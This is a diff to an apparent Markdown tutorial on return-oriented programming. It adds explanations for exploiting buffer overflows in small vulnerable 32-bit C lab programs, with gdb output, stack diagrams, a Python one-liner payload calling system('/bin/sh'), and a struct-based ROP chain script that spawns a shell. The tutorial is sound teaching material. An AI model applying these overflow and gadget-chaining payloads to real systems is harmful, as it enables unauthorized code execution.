@@ -124,10 +124,12 @@ Note that `\x` in Python is the formatter for a Hex values.
 
 # Passing arguments
 
+Now that we called an arbitrary function we want to be able to pass argument(s). The following program slighlty varies from the previous example. This time, an unused function `tchoo_tchoo` is found in the program but calling it won't spawn a shell. Instead, we want to overwrite the parsed parameter in `system` with the correctio nargument.
+
 ```C
 char* safe_string = "/bin/sh";
 
-void tchoo_tchoo(char* buffer)
+void tchoo_tchoo()
 {	
 	printf("Here comes the train \n:");
 	system("/bin/sl");
@@ -150,35 +152,64 @@ int main(int argc, char** argv)
 }
 ```
 
+Using `gdb` we search relevant information again, `x/s` displays the content stored at a given address in the specified format (s stands for string):
+
+```
+❯ gdb -q calling_args 
+Reading symbols from calling_args...(no debugging symbols found)...done.
+
+(gdb) x/s safe_string
+0x8048620:	"/bin/sh"
+
+(gdb) p system
+$1 = {<text variable, no debug info>} 0x80483c0 <system@plt>
+```
+
+In order to call `system` with `safe_string` as an argument, we have to set up the stack properly. We will construct our payload such that the stack looks like a call to `system(safe_string)` after the return.
+
+```
+| 0x8048620  <safe_string>         |
+| 0x43434343 <fake return address> | "CCCC"
+| 0x80483c0  <address of system>   | 
+| 0x42424242 <fake old %ebp>       | "BBBB"
+| 0x41414141 ...                   |
+|   ... (0x6c bytes of 'A's)       |
+|   ... 0x41414141                 |
+```
+
+Finally we modify our Python script to launch the attack:
+
+```bash
+❯ ./calling_args "$(python2 -c 'print "A"*0x6c + "BBBB" + "\xc0\x83\x04\x08"+ "CCCC" + "\x20\x86\x04\x08"')"
+sh-4.4$
+```
+
 # Creating a ROP chain
 
+So far we only called single functions exisiting in the programs. ROP offers much more as it is possible to run arbitrary code rather than just calling available functions. We do this by chaining _gadgets_ which are short sequences of instructions ending in a _ret_. For example,i the following pair of gadgets will allow the attacker to write arbitrary values at arbitrary locations.
+
+```asm
+pop %ecx
+pop %eax
+ret
+
+mov %eax, (%ecx)
+ret
+```
+
+These work by poping values from the stack (which we control) into registers and then executing code that uses them. To use, we set up the stack like so:
+
+```
+| <address of mov %eax, (%ecx)>        |
+| <value to write>                     | popped into %eax
+| <address to write to>                | popped into %ecx
+| <address of pop %ecx; pop %eax; ret> |
+```
+You'll see that the first gadget returns to the second gadget, continuing the chain of attacker controlled code execution (this next gadget can continue).
+
+We will illustrate how to use ROP to construct a payload in the program below. Our goal is to chain three functions `add_bin`, `add_sh` and `exec_command` to spawn a shell.
+
 ```C
-//Vulnerability: Buffer Overflow
-//Goal: Call add_sh() -> add_bin() -> exec_command()
-//Payload:
-//
-//	We control the stack and push the key args to pass the tests.
-//	A pop; ret; gadget is inserted as a return addr of the function
-//	so that the argument is removed from the stack and the program
-//	returns to the next gadget (gadget chaining).
-//
-//	+-----------------------------+
-//	|            stack            |
-//	+-----------------------------+
-//	| <address of exec_command()> |
-//	| 0xcafebabe <key1>           |
-//	| 0x8badfood <key2>	      |
-//	| <address of POP; POP; RET>  |
-//	| <address of add_sh()>       |
-//	| 0xdeadbeef <key>            | <argument>
-//	| <address of POP; RET>       | <return addr>
-//	| <address of add_bin()>      | <function call>
-//	| 0x42424242 <fake old %ebp>  |
-//	| 0x41414141 ...              |
-//	|   ... (0x6c bytes of 'A's)  |
-//	|   ... 0x41414141            | 0x41414141 == "AAAA"
-
-
 char command[100];
 
 void exec_command()
@@ -213,7 +244,35 @@ int main(int argc, char** argv)
 	return 0;
 }
 ```
+In order to pass the tests required in each functions, we need to set up the stack and use `pop; ret` gadgets chain the function calls. For example, when we call `add_bin` the stack must look like: 
 
+```
+| 0xdeadbeef            |
+| <address of pop; ret> |
+| <address of add_bin>  |
+```
+When the program returns `0xdeadbeef` is popped from the stack into whichever register (we will ignore it from now on) and the `ret` instruction returns to the next address. The mechanism is the same for `add_sh`, below is the state of the stack after our payload.
+
+```
+	+-----------------------------+
+	|            stack            |
+	+-----------------------------+
+	| <address of exec_command()> |
+	| 0xcafebabe <key1>           |
+	| 0x8badfood <key2>	          |
+	| <address of POP; POP; RET>  |
+	| <address of add_sh()>       |
+	| 0xdeadbeef <key>            | <argument>
+	| <address of POP; RET>       | <return addr>
+	| <address of add_bin()>      | <function call>
+	| 0x42424242 <fake old %ebp>  |
+	| 0x41414141 ...              |
+	|   ... (0x6c bytes of 'A's)  |
+	|   ... 0x41414141            | 0x41414141 == "AAAA"
+
+```
+
+This time we will use a python wrapper (which will also show off the use of the very useful struct python module).
 
 ```python
 #!/usr/bin/python2
@@ -250,4 +309,9 @@ payload += struct.pack("I", 0x8badf00d)
 payload += struct.pack("I", exec_command)
 
 os.system("./chaining_func \"%s\"" % payload)
+```
+
+```
+❯ ./payload.py 
+sh-4.4$ 
 ```
